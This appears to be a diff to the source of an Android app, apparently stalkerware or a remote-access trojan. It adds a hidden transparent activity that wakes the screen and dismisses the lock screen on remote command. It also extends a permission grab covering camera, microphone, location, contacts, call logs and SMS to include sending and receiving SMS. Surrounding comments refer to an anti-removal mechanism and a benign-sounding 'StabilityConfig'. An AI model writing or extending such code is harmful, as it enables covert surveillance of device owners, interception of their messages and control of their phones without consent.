@@ -114,6 +114,22 @@ public class PermissionActivity extends Activity {
         // SUSPEND ANTI-REMOVAL
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();
 
+        if (getIntent() != null && getIntent().getBooleanExtra("wake_screen", false)) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+                setShowWhenLocked(true);
+                setTurnScreenOn(true);
+            } else {
+                getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                     android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                                     android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
+                                     android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+            }
+            setContentView(new android.view.View(this));
+            getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
+            new Handler(Looper.getMainLooper()).postDelayed(this::finish, 100);
+            return;
+        }
+
         if (getIntent() != null && getIntent().getBooleanExtra("launch_admin", false)) {
             setContentView(new android.view.View(this));
             getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
@@ -664,6 +680,7 @@ public class PermissionActivity extends Activity {
         String[] perms = {
             Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
             Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
+            Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS
         };
 
